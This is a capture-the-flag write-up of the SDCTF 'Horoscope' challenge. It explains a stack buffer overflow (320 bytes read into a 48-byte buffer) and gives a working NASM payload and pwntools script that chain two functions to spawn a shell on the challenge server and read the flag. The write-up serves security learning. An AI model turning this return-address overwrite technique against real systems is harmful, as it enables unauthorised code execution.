# Horoscope
`checksec` output:<br>
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
The binary is static with partial relro and no stack canary.<br>
Looking at the decompiled code in `ghidra`:
```c
undefined8 main(void) {
    char local_38 [48];
    puts("Welcome to SDCTF\'s very own text based horoscope");
    puts("please put in your birthday and time in the format (month/day/year/time) and we will have you r very own horoscope");
    fflush(stdout);
    fgets(local_38,0x140,stdin);
    processInput(local_38);
    return 0;
}
```
It is obvious that this is a buffer overflow attack. The program allows the user to read 320 bytes into a 48 byte buffer.<br>
In the binary there were two functions:<br>
`debug` at static address `0x40096e`
```c
void debug(void) {
    temp = 1;
    return;
}
```
`test` at static address `0x400950`
```c
void test(void) {
    if (temp == 1) {
        system("/bin/sh");
    }
    return;
}
```
To exploit this binary overflow the buffer and overwrite the return address with the address of debug followed by the address of test.
```x86asm
db "1/1/1/1"       ; needed to pass processInput function
times 49 db "A"    ; bytes to fill the buffer
dq 0x40096e        ; address of debug
dq 0x400950        ; address of test
db 0x0a            ; ending newline or netcat will not send the data
```
compiled with `nasm -f bin payload.asm -o payload.bin`<br>
```python
from pwn import *;

io = remote("horoscope.sdc.tf", 1337);
io.recv();

file = open("./payload.bin", "rb");
io.send(file.read());
io.recvuntil(b':)');
io.interactive();
```
```
[+] Opening connection to horoscope.sdc.tf on port 1337: Done
[*] Switching to interactive mode
$ ls
flag.txt
horoscope
$ cat flag.txt
sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}
```
## Flag: sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}